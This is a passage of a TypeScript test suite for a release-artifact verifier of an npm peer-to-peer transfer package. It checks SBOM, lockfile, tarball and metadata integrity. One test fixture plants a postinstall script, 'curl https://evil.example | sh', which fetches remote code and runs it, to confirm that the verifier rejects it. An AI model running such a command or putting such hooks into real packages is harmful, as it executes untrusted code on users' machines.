import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { gzipSync } from "node:zlib";

const verifierSource = await fs.readFile(new URL("../scripts/verify-release-artifact.mjs", import.meta.url), "utf8");

test("release artifact verifier accepts a bounded well-formed npm tarball", async () => {
  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2,
      trailingBlocks: [zeroBlock()]
    })
  });

  assert.equal(result.status, 0, result.stderr);
});

test("release artifact verifier rejects checksummed SBOMs for the wrong package", async () => {
  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    sbom: Buffer.from(`${JSON.stringify(fixtureSbom("@victorhaine/p2p-transfer", "9.9.9"))}\n`, "utf8"),
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release SBOM component version does not match the package\./);
  assert.doesNotMatch(result.stderr, /9\.9\.9|victorhaine/);
});

test("release artifact verifier rejects SBOMs missing reviewed native WebRTC", async () => {
  const sbom = cloneJson(fixtureSbom("@victorhaine/p2p-transfer", "1.2.3"));
  sbom.components = sbom.components.filter((component: { purl: string }) => component.purl !== "pkg:npm/%40roamhq/wrtc@0.10.0");

  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    sbom: Buffer.from(`${JSON.stringify(sbom)}\n`, "utf8"),
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release SBOM production dependency inventory does not match package\.json and pnpm-lock\.yaml\./);
  assert.doesNotMatch(result.stderr, /roamhq|wrtc/);
});

test("release artifact verifier rejects SBOMs with tampered PAKE dependency identity", async () => {
  const sbom = cloneJson(fixtureSbom("@victorhaine/p2p-transfer", "1.2.3"));
  const component = sbom.components.find((entry: { purl: string }) => entry.purl === "pkg:npm/%40cipherman/pake-js@0.1.1");
  assert.ok(component);
  component.version = "9.9.9";
  component.purl = "pkg:npm/%40cipherman/pake-js@9.9.9";
  component["bom-ref"] = "pkg:npm/%40cipherman/pake-js@9.9.9";

  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    sbom: Buffer.from(`${JSON.stringify(sbom)}\n`, "utf8"),
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release SBOM production dependency inventory does not match package\.json and pnpm-lock\.yaml\./);
  assert.doesNotMatch(result.stderr, /cipherman|pake|9\.9\.9/);
});

test("release artifact verifier rejects SBOMs that disconnect direct WebSocket dependency edges", async () => {
  const sbom = cloneJson(fixtureSbom("@victorhaine/p2p-transfer", "1.2.3"));
  const root = sbom.dependencies.find((entry: { ref: string }) => entry.ref === "pkg:npm/%40victorhaine/p2p-transfer@1.2.3");
  assert.ok(root);
  root.dependsOn = root.dependsOn.filter((ref: string) => ref !== "pkg:npm/ws@8.20.1");

  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    sbom: Buffer.from(`${JSON.stringify(sbom)}\n`, "utf8"),
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release SBOM production dependency inventory does not match package\.json and pnpm-lock\.yaml\./);
  assert.doesNotMatch(result.stderr, /ws@8\.20\.1|WebSocket/);
});

test("release artifact verifier rejects SBOMs that omit transitive dependency edges", async () => {
  const sbom = cloneJson(fixtureSbom("@victorhaine/p2p-transfer", "1.2.3"));
  const wrtc = sbom.dependencies.find((entry: { ref: string }) => entry.ref === "pkg:npm/%40roamhq/wrtc@0.10.0");
  assert.ok(wrtc);
  wrtc.dependsOn = wrtc.dependsOn.filter((ref: string) => ref !== "pkg:npm/domexception@4.0.0");

  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    sbom: Buffer.from(`${JSON.stringify(sbom)}\n`, "utf8"),
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release SBOM production dependency inventory does not match package\.json and pnpm-lock\.yaml\./);
  assert.doesNotMatch(result.stderr, /domexception|roamhq|wrtc/);
});

test("release artifact verifier prints the verified tarball path on request", async () => {
  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    args: ["--print-tarball"],
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.equal(result.status, 0, result.stderr);
  assert.equal(result.stdout, "release-artifacts/victorhaine-p2p-transfer-1.2.3.tgz\n");
  assert.equal(result.stderr, "");
  assert.doesNotMatch(result.stdout, new RegExp(escapeRegExp(result.root)));
});

test("release artifact verifier writes the verified tarball path to GitHub output", async () => {
  const result = await runVerifierInFixture({
    packageName: "@victorhaine/p2p-transfer",
    version: "1.2.3",
    args: ["--github-output", "tarball"],
    githubOutputFileName: "github-output.txt",
    tarBlocks: packageJsonTarBlocks("@victorhaine/p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.equal(result.status, 0, result.stderr);
  assert.equal(result.stdout, "");
  assert.equal(result.stderr, "");
  assert.ok(result.githubOutputPath);
  assert.equal(await fs.readFile(result.githubOutputPath, "utf8"), "tarball=release-artifacts/victorhaine-p2p-transfer-1.2.3.tgz\n");
});

test("release artifact verifier rejects unexpected CLI arguments without a stack", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    args: ["--print-tarball", "--extra"],
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /Unsupported release artifact verifier arguments\./);
  assert.doesNotMatch(result.stderr, /verify-release-artifact\.mjs\s*:|SyntaxError/);
  assert.equal(result.stdout, "");
});

test("release artifact verifier rejects a single tar end marker followed by data", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 1,
      trailingBlocks: [Buffer.alloc(512, 0x41)]
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /malformed tar end-of-archive marker/);
});

test("release artifact verifier rejects non-zero data after a complete tar end marker", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2,
      trailingBlocks: [Buffer.alloc(512, 0x41)]
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /non-zero data after tar end-of-archive/);
});

test("release artifact verifier rejects invalid UTF-8 packed package metadata deterministically", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: Buffer.from([0xff]),
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /package\/package\.json is not valid UTF-8\./);
});

test("release artifact verifier rejects invalid packed package JSON deterministically", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: Buffer.from("{not json}\n", "utf8"),
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /package\/package\.json is not valid JSON\./);
});

test("release artifact verifier top-level failures do not print stacks or raw package evidence", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    packageJson: Buffer.from("{bad release json from workspace}\n"),
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /Release artifact verification failed:/);
  assert.match(result.stderr, /package\.json is not valid JSON\./);
  assert.doesNotMatch(result.stderr, /bad release|workspace|verify-release-artifact\.mjs\s*:|SyntaxError/);
  assert.doesNotMatch(result.stderr, new RegExp(escapeRegExp(result.root)));
});

test("release artifact verifier rejects invalid gzip archives deterministically", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarball: Buffer.from("not a gzip archive\n", "utf8")
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release tarball is not a valid gzip archive\./);
});

test("release artifact verifier rejects unsafe names on skipped tar entries", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: [
      tarHeader("package/bad\nname", 0),
      ...packageJsonTarBlocks("p2p-transfer", "1.2.3", {
        endBlocks: 2
      })
    ]
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /unsafe tar entry name/);
});

test("release artifact verifier byte-caps release tag environment input", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    refName: "😀".repeat(65),
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /GITHUB_REF_NAME must be a non-empty NUL-free string under 256 UTF-8 bytes\./);
});

test("release artifact verifier does not echo mismatched release tag text", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    refName: "wrong-tag\nwith-control",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release tag does not match package version 1\.2\.3\./);
  assert.doesNotMatch(result.stderr, /wrong-tag/);
  assert.doesNotMatch(result.stderr, /with-control/);
});

test("release artifact verifier validates packed package metadata before mismatch reporting", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: Buffer.from(`${JSON.stringify({ name: "bad\nname", version: "1.2.3" })}\n`, "utf8"),
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /package\/package\.json name must be an exact npm package name\./);
  assert.doesNotMatch(result.stderr, /bad\\nname|bad\nname/);
});

test("release artifact verifier does not echo mismatched packed package metadata", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: Buffer.from(`${JSON.stringify(fixturePackageJson("other-package", "1.2.3"))}\n`, "utf8"),
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release artifact package metadata does not match the checked workspace metadata\./);
  assert.doesNotMatch(result.stderr, /other-package/);
});

test("release artifact verifier rejects install lifecycle scripts in packed metadata", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: Buffer.from(`${JSON.stringify({ ...fixturePackageJson("p2p-transfer", "1.2.3"), scripts: { postinstall: "curl https://evil.example | sh" } })}\n`, "utf8"),
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /package\/package\.json must not contain install lifecycle scripts\./);
  assert.doesNotMatch(result.stderr, /curl|evil|postinstall/);
});

test("release artifact verifier rejects changed packed bin and dependency metadata", async () => {
  for (const body of [
    { ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), bin: { ff: "./dist-node/cli/evil.js", "ff-server": "./dist-node/server/index.js" } },
    { ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), dependencies: { ...fixturePackedPackageJson("p2p-transfer", "1.2.3").dependencies, ws: "8.99.99" } },
    { ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), publishConfig: { access: "restricted", provenance: true } },
    { ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), optionalDependencies: { "left-pad": "1.3.0" } },
    { ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), exports: { ".": "./dist-node/cli/index.js" } },
    fixturePackageJson("p2p-transfer", "1.2.3")
  ]) {
    const result = await runVerifierInFixture({
      packageName: "p2p-transfer",
      version: "1.2.3",
      tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
        body: Buffer.from(`${JSON.stringify(body)}\n`, "utf8"),
        endBlocks: 2
      })
    });

    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release artifact package metadata does not match the checked workspace metadata\./);
    assert.doesNotMatch(result.stderr, /evil\.js|8\.99\.99|restricted|left-pad|dist-node\/cli\/index\.js/);
  }
});

test("release artifact verifier rejects changed packed file contents", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    tarBlocks: packageTarBlocks("p2p-transfer", "1.2.3", {
      fileBodies: {
        "dist-node/cli/index.js": Buffer.from("#!/usr/bin/env node\nconsole.log('pwned')\n", "utf8")
      },
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release tarball file contents do not match the checked workspace\./);
  assert.doesNotMatch(result.stderr, /pwned|dist-node\/cli\/index\.js/);
});

test("release artifact verifier rejects unexpected and missing packed files", async () => {
  for (const tarBlocks of [
    packageTarBlocks("p2p-transfer", "1.2.3", {
      extraFiles: { "package/dist-node/cli/extra.js": Buffer.from("extra\n", "utf8") },
      endBlocks: 2
    }),
    packageTarBlocks("p2p-transfer", "1.2.3", {
      omitFiles: ["dist-web/index.html"],
      endBlocks: 2
    })
  ]) {
    const result = await runVerifierInFixture({
      packageName: "p2p-transfer",
      version: "1.2.3",
      tarBlocks
    });

    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release tarball contains an unexpected package file|release tarball is missing expected package files/);
    assert.doesNotMatch(result.stderr, /extra\.js|dist-web\/index\.html/);
  }
});

test("release artifact verifier rejects package file lists that expand past the file cap", async () => {
  const body = Buffer.from(`${JSON.stringify({ ...fixturePackageJson("p2p-transfer", "1.2.3"), files: ["many"] })}\n`, "utf8");
  const packedBody = Buffer.from(`${JSON.stringify({ ...fixturePackedPackageJson("p2p-transfer", "1.2.3"), files: ["many"] })}\n`, "utf8");
  const extraWorkspaceFiles: Record<string, Buffer> = {};
  for (let index = 0; index < 4096; index += 1) {
    extraWorkspaceFiles[`many/${String(index).padStart(4, "0")}.txt`] = Buffer.from("x\n", "utf8");
  }

  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    packageJson: body,
    extraWorkspaceFiles,
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      body: packedBody,
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /package\.json files expands to too many package files\./);
  assert.doesNotMatch(result.stderr, /many\/0000|many\/4095/);
});

test("release artifact verifier rejects unsafe artifact directory entry names without echoing them", async () => {
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    extraArtifactEntries: [{ name: "evil\nname.tgz", body: Buffer.from("not the artifact\n", "utf8") }],
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release-artifacts contains an invalid artifact entry name\./);
  assert.doesNotMatch(result.stderr, /evil|name\.tgz/);
});

test("release artifact verifier rejects symlinked artifact directories without path leakage", { skip: process.platform === "win32" ? "directory symlink behavior differs on Windows." : false }, async () => {
  const outsideArtifactDir = await fs.mkdtemp(path.join(os.tmpdir(), "ff-release-verify-outside-"));
  const result = await runVerifierInFixture({
    packageName: "p2p-transfer",
    version: "1.2.3",
    artifactDirSymlinkTarget: outsideArtifactDir,
    tarBlocks: packageJsonTarBlocks("p2p-transfer", "1.2.3", {
      endBlocks: 2
    })
  });

  try {
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release artifact directory must be a real directory\./);
    assert.doesNotMatch(result.stderr, /ff-release-verify-|ff-release-verify-outside-|release-artifacts|p2p-transfer-1\.2\.3\.tgz/);
    assert.equal(result.stdout, "");
  } finally {
    await fs.rm(result.root, { force: true, recursive: true });
    await fs.rm(outsideArtifactDir, { force: true, recursive: true });
  }
});

async function runVerifierInFixture(options: {
  packageName: string;
  version: string;
  packageJson?: Buffer;
  refName?: string;
  args?: string[];
  githubOutputFileName?: string;
  tarBlocks?: Buffer[];
  tarball?: Buffer;
  sbom?: Buffer;
  extraArtifactEntries?: { name: string; body?: Buffer }[];
  extraWorkspaceFiles?: Record<string, Buffer>;
  artifactDirSymlinkTarget?: string;
}) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "ff-release-verify-"));
  const scriptsDir = path.join(root, "scripts");
  const artifactDir = path.join(root, "release-artifacts");
  await fs.mkdir(scriptsDir);
  if (options.artifactDirSymlinkTarget) {
    await fs.symlink(options.artifactDirSymlinkTarget, artifactDir, "dir");
  } else {
    await fs.mkdir(artifactDir);
  }
  await fs.writeFile(path.join(root, "package.json"), options.packageJson ?? `${JSON.stringify(fixturePackageJson(options.packageName, options.version))}\n`);
  await fs.writeFile(path.join(root, "pnpm-lock.yaml"), fixtureLockfile(options.packageName, options.version));
  await fs.writeFile(path.join(scriptsDir, "verify-release-artifact.mjs"), verifierSource, { mode: 0o755 });
  await writeFixtureWorkspaceFiles(root);
  await writeExtraWorkspaceFiles(root, options.extraWorkspaceFiles ?? {});

  const tarballName = `${packedPackageName(options.packageName)}-${options.version}.tgz`;
  const tarball = options.tarball ?? gzipSync(Buffer.concat(options.tarBlocks ?? []));
  const sbom = options.sbom ?? Buffer.from(`${JSON.stringify(fixtureSbom(options.packageName, options.version))}\n`, "utf8");
  const digest = createHash("sha256").update(tarball).digest("hex");
  const sbomDigest = createHash("sha256").update(sbom).digest("hex");
  await fs.writeFile(path.join(artifactDir, tarballName), tarball);
  await fs.writeFile(path.join(artifactDir, "SBOM.cdx.json"), sbom);
  await fs.writeFile(path.join(artifactDir, "SHA256SUMS"), `${digest}  ${tarballName}\n${sbomDigest}  SBOM.cdx.json\n`);
  for (const entry of options.extraArtifactEntries ?? []) {
    await fs.writeFile(path.join(artifactDir, entry.name), entry.body ?? Buffer.alloc(0));
  }
  const githubOutputPath = options.githubOutputFileName ? path.join(root, options.githubOutputFileName) : undefined;
  if (githubOutputPath) await fs.writeFile(githubOutputPath, "");

  const result = spawnSync(process.execPath, [path.join(scriptsDir, "verify-release-artifact.mjs"), ...(options.args ?? [])], {
    cwd: root,
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_REF_NAME: options.refName ?? `v${options.version}`,
      ...(githubOutputPath ? { GITHUB_OUTPUT: githubOutputPath } : {})
    },
    timeout: 10_000
  });
  return { ...result, root, githubOutputPath };
}

function packageJsonTarBlocks(packageName: string, version: string, options: { body?: Buffer; endBlocks: 1 | 2; trailingBlocks?: Buffer[] }): Buffer[] {
  return packageTarBlocks(packageName, version, options);
}

function packedPackageName(packageName: string): string {
  return packageName.startsWith("@") ? packageName.slice(1).replace("/", "-") : packageName;
}

function packagePurl(packageName: string, version: string): string {
  if (packageName.startsWith("@")) {
    const [scope, localName] = packageName.slice(1).split("/");
    assert.ok(scope);
    assert.ok(localName);
    return `pkg:npm/%40${scope}/${localName}@${version}`;
  }
  return `pkg:npm/${packageName}@${version}`;
}

function packageLocalName(packageName: string): string {
  if (!packageName.startsWith("@")) return packageName;
  const localName = packageName.slice(1).split("/")[1];
  assert.ok(localName);
  return localName;
}

function packageGroup(packageName: string): string | undefined {
  if (!packageName.startsWith("@")) return undefined;
  const scope = packageName.slice(1).split("/")[0];
  assert.ok(scope);
  return `@${scope}`;
}

function fixtureSbom(packageName: string, version: string) {
  const graph = fixtureProductionGraph(packageName, version);
  return {
    bomFormat: "CycloneDX",
    specVersion: "1.7",
    metadata: {
      component: {
        type: "application",
        name: packageLocalName(packageName),
        version,
        purl: packagePurl(packageName, version),
        "bom-ref": packagePurl(packageName, version),
        ...(packageGroup(packageName) ? { group: packageGroup(packageName) } : {})
      }
    },
    components: graph.packages.map((component) => ({
        type: "library",
        name: packageLocalName(component.name),
        version: component.version,
        purl: packagePurl(component.name, component.version),
        "bom-ref": packagePurl(component.name, component.version),
        ...(packageGroup(component.name) ? { group: packageGroup(component.name) } : {})
      })),
    dependencies: graph.dependencies.map(([ref, dependsOn]) => ({ ref, dependsOn }))
  };
}

function fixtureProductionGraph(packageName: string, version: string) {
  const rootPurl = packagePurl(packageName, version);
  const directDependencies = Object.entries(fixturePackageJson(packageName, version).dependencies).sort(([left], [right]) => left.localeCompare(right));
  const snapshotDependencies: Record<string, { dependencies?: Record<string, string>; optionalDependencies?: Record<string, string> }> = {
    "@cipherman/pake-js@0.1.1": { dependencies: { "@noble/curves": "1.9.7" } },
    "@noble/curves@1.9.7": { dependencies: { "@noble/hashes": "1.8.0" } },
    "@noble/hashes@1.8.0": {},
    "@noble/hashes@2.2.0": {},
    "@roamhq/wrtc@0.10.0": {
      optionalDependencies: {
        "@roamhq/wrtc-darwin-arm64": "0.10.0",
        "@roamhq/wrtc-darwin-x64": "0.10.0",
        "@roamhq/wrtc-linux-arm64": "0.10.0",
        "@roamhq/wrtc-linux-x64": "0.10.0",
        "@roamhq/wrtc-win32-x64": "0.10.0",
        domexception: "4.0.0"
      }
    },
    "@roamhq/wrtc-darwin-arm64@0.10.0": {},
    "@roamhq/wrtc-darwin-x64@0.10.0": {},
    "@roamhq/wrtc-linux-arm64@0.10.0": {},
    "@roamhq/wrtc-linux-x64@0.10.0": {},
    "@roamhq/wrtc-win32-x64@0.10.0": {},
    "@scure/bip39@2.2.0": { dependencies: { "@scure/base": "2.2.0" } },
    "@scure/base@2.2.0": {},
    commander: {},
    "commander@14.0.3": {},
    "domexception@4.0.0": { dependencies: { "webidl-conversions": "7.0.0" } },
    "nanoid@5.1.11": {},
    "webidl-conversions@7.0.0": {},
    "ws@8.20.1": {}
  };
  delete snapshotDependencies.commander;

  const packages = new Map<string, { name: string; version: string; dependsOn: string[] }>();
  const dependencies = new Map<string, string[]>([[rootPurl, directDependencies.map(([name, dependencyVersion]) => packagePurl(name, dependencyVersion)).sort()]]);
  const stack = directDependencies.map(([name, dependencyVersion]) => `${name}@${dependencyVersion}`);
  while (stack.length > 0) {
    const key = stack.pop();
    assert.ok(key);
    const parsed = parseFixturePackageKey(key);
    const purl = packagePurl(parsed.name, parsed.version);
    if (packages.has(purl)) continue;
    const snapshot = snapshotDependencies[key];
    assert.ok(snapshot, `missing fixture snapshot for ${key}`);
    const dependsOn: string[] = [];
    packages.set(purl, { name: parsed.name, version: parsed.version, dependsOn });
    for (const [dependencyName, dependencyVersion] of Object.entries({ ...(snapshot.dependencies ?? {}), ...(snapshot.optionalDependencies ?? {}) }).sort(([left], [right]) => left.localeCompare(right))) {
      dependsOn.push(packagePurl(dependencyName, dependencyVersion));
      stack.push(`${dependencyName}@${dependencyVersion}`);
    }
    dependencies.set(purl, dependsOn.sort());
  }
  return { packages: [...packages.values()].sort((left, right) => packagePurl(left.name, left.version).localeCompare(packagePurl(right.name, right.version))), dependencies: [...dependencies.entries()].sort(([left], [right]) => left.localeCompare(right)) };
}

function fixtureLockfile(packageName: string, version: string): string {
  const packageJson = fixturePackageJson(packageName, version);
  const graph = fixtureProductionGraph(packageName, version);
  const lines = [
    "lockfileVersion: '9.0'",
    "",
    "settings:",
    "  autoInstallPeers: false",
    "  excludeLinksFromLockfile: false",
    "",
    "importers:",
    "",
    "  .:",
    "    dependencies:"
  ];
  for (const [name, dependencyVersion] of Object.entries(packageJson.dependencies).sort(([left], [right]) => left.localeCompare(right))) {
    lines.push(`      ${fixtureYamlKey(name)}:`, `        specifier: ${dependencyVersion}`, `        version: ${dependencyVersion}`);
  }
  lines.push("", "packages:", "");
  for (const component of graph.packages) {
    lines.push(`  ${fixtureYamlKey(`${component.name}@${component.version}`)}:`, "    resolution: {integrity: sha512-fixture}", "");
  }
  lines.push("snapshots:", "");
  const dependencies = new Map(graph.dependencies);
  for (const component of graph.packages) {
    const key = `${component.name}@${component.version}`;
    lines.push(`  ${fixtureYamlKey(key)}:`);
    const dependsOn = dependencies.get(packagePurl(component.name, component.version)) ?? [];
    if (dependsOn.length > 0) {
      const field = component.name === "@roamhq/wrtc" ? "optionalDependencies" : "dependencies";
      lines.push(`    ${field}:`);
      for (const ref of dependsOn) {
        const dependency = parseFixturePurl(ref);
        lines.push(`      ${fixtureYamlKey(dependency.name)}: ${dependency.version}`);
      }
    } else {
      lines.push("    optional: false");
    }
    lines.push("");
  }
  return `${lines.join("\n")}\n`;
}

function parseFixturePurl(purl: string) {
  const match = /^pkg:npm\/(?:%40([^/]+)\/)?([^@]+)@(\d+\.\d+\.\d+)$/.exec(purl);
  assert.ok(match);
  const localName = match[2];
  const version = match[3];
  assert.ok(localName);
  assert.ok(version);
  return { name: match[1] ? `@${match[1]}/${localName}` : localName, version };
}

function parseFixturePackageKey(key: string) {
  const index = key.lastIndexOf("@");
  assert.ok(index > 0);
  return { name: key.slice(0, index), version: key.slice(index + 1) };
}

function fixtureYamlKey(value: string): string {
  return /^[A-Za-z0-9._~-]+$/.test(value) ? value : `'${value.replace(/'/g, "''")}'`;
}

function cloneJson<T>(value: T): T {
  return JSON.parse(JSON.stringify(value)) as T;
}

function packageTarBlocks(
  packageName: string,
  version: string,
  options: {
    body?: Buffer;
    fileBodies?: Record<string, Buffer>;
    extraFiles?: Record<string, Buffer>;
    omitFiles?: string[];
    endBlocks: 1 | 2;
    trailingBlocks?: Buffer[];
  }
): Buffer[] {
  const body = options.body ?? Buffer.from(`${JSON.stringify(fixturePackedPackageJson(packageName, version))}\n`, "utf8");
  const omit = new Set(options.omitFiles ?? []);
  const fileEntries = Object.entries(fixtureWorkspaceFiles())
    .filter(([name]) => !omit.has(name))
    .flatMap(([name, fileBody]) => fileTarBlocks(`package/${name}`, options.fileBodies?.[name] ?? fileBody));
  const extraEntries = Object.entries(options.extraFiles ?? {}).flatMap(([name, fileBody]) => fileTarBlocks(name, fileBody));
  return [
    tarHeader("package/package.json", body.byteLength),
    body,
    Buffer.alloc(paddedSize(body.byteLength) - body.byteLength),
    ...fileEntries,
    ...extraEntries,
    ...Array.from({ length: options.endBlocks }, () => zeroBlock()),
    ...(options.trailingBlocks ?? [])
  ];
}

function fixturePackageJson(packageName: string, version: string) {
  return {
    name: packageName,
    version,
    description: "fixture package",
    packageManager: "pnpm@11.1.3",
    type: "module",
    publishConfig: {
      access: "public",
      provenance: true
    },
    exports: {},
    files: ["conformance", "dist-node/cli", "dist-node/server", "dist-node/shared", "dist-web", "CHANGELOG.md", "CONTRIBUTING.md", "LICENSE", "README.md", "SECURITY.md"],
    engines: { node: ">=22.22.3 <23 || >=24.13.1 <25" },
    bin: {
      ff: "./dist-node/cli/index.js",
      "ff-server": "./dist-node/server/index.js"
    },
    dependencies: {
      "@cipherman/pake-js": "0.1.1",
      "@noble/curves": "1.9.7",
      "@noble/hashes": "2.2.0",
      "@roamhq/wrtc": "0.10.0",
      "@scure/bip39": "2.2.0",
      commander: "14.0.3",
      nanoid: "5.1.11",
      ws: "8.20.1"
    }
  };
}

function fixturePackedPackageJson(packageName: string, version: string) {
  const { packageManager: _packageManager, ...packed } = fixturePackageJson(packageName, version);
  return packed;
}

function fixtureWorkspaceFiles(): Record<string, Buffer> {
  return {
    "conformance/protocol-v5.json": Buffer.from('{"protocolVersion":5}\n', "utf8"),
    "dist-node/cli/index.js": Buffer.from("#!/usr/bin/env node\nconsole.log('fixture cli')\n", "utf8"),
    "dist-node/server/index.js": Buffer.from("#!/usr/bin/env node\nconsole.log('fixture server')\n", "utf8"),
    "dist-node/shared/constants.js": Buffer.from("export const fixture = true;\n", "utf8"),
    "dist-web/index.html": Buffer.from("<!doctype html><title>fixture</title>\n", "utf8"),
    "CHANGELOG.md": Buffer.from("# changelog\n", "utf8"),
    "CONTRIBUTING.md": Buffer.from("# contributing\n", "utf8"),
    "LICENSE": Buffer.from("MIT\n", "utf8"),
    "README.md": Buffer.from("# fixture\n", "utf8"),
    "SECURITY.md": Buffer.from("# security\n", "utf8")
  };
}

async function writeFixtureWorkspaceFiles(root: string): Promise<void> {
  for (const [name, body] of Object.entries(fixtureWorkspaceFiles())) {
    const file = path.join(root, name);
    await fs.mkdir(path.dirname(file), { recursive: true });
    await fs.writeFile(file, body);
  }
}

async function writeExtraWorkspaceFiles(root: string, files: Record<string, Buffer>): Promise<void> {
  for (const [name, body] of Object.entries(files)) {
    const file = path.join(root, name);
    await fs.mkdir(path.dirname(file), { recursive: true });
    await fs.writeFile(file, body);
  }
}

function fileTarBlocks(name: string, body: Buffer): Buffer[] {
  return [tarHeader(name, body.byteLength), body, Buffer.alloc(paddedSize(body.byteLength) - body.byteLength)];
}

function tarHeader(name: string, size: number): Buffer {
  const header = Buffer.alloc(512);
  writeAscii(header, name, 0, 100);
  writeAscii(header, "0000644\0", 100, 8);
  writeAscii(header, "0000000\0", 108, 8);
  writeAscii(header, "0000000\0", 116, 8);
  writeAscii(header, octal(size, 11), 124, 12);
  writeAscii(header, "00000000000\0", 136, 12);
